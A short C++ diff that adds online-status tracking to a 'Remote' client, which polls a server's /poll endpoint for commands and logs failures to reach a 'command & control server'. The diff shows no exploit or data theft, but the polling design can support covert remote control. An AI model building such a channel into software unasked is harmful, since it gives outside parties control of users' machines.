@@ -131,6 +131,11 @@ void Remote::socket_listener_main()
     }
 }
 
+bool Remote::get_online_status()
+{
+    return _online;
+}
+
 void Remote::start_listening()
 {
     _listening = true;
@@ -211,10 +216,14 @@ Remote::CommandFn Remote::cmd_handle_server_cmd(const CommandArgs args)
 
 void Remote::http_polling_main()
 {
+    _online = true;
+
     while (_listening) {
         SoupMessage *msg = soup_message_new("GET", (k_server_url + "/poll").c_str());
         guint status = soup_session_send_message(_http_session.get(), msg);
         if (status == 200) {
+            _online = true;
+
             // Parse response body
             GBytes *response_bytes = soup_buffer_get_as_bytes(
                 soup_message_body_flatten(msg->response_body)
@@ -239,6 +248,7 @@ void Remote::http_polling_main()
             fprintf(stderr, "Got status %d from the polling thread\n", status);
             switch (status) {
                 case SOUP_STATUS_CANT_CONNECT:
+                    _online = false;
                     fprintf(stderr, "Unable to connect to command & control server\n");
                     fprintf(stderr, "Trying again in 15 seconds\n");
 
